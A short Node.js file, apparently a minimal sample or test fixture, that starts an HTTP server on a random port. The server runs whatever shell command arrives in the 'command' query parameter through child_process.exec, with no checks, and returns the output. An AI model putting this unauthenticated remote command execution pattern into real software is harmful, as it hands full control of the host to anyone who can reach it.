import { exec } from "node:child_process";
import { createServer } from "node:http";

const server = createServer((request, response) => {
  const requestUrl = new URL(request.url ?? "", "http://localhost");
  const command = requestUrl.searchParams.get("command") ?? "";

  exec(command, (error, stdout) => {
    response.end(error?.message ?? stdout);
  });
});

server.listen(0);
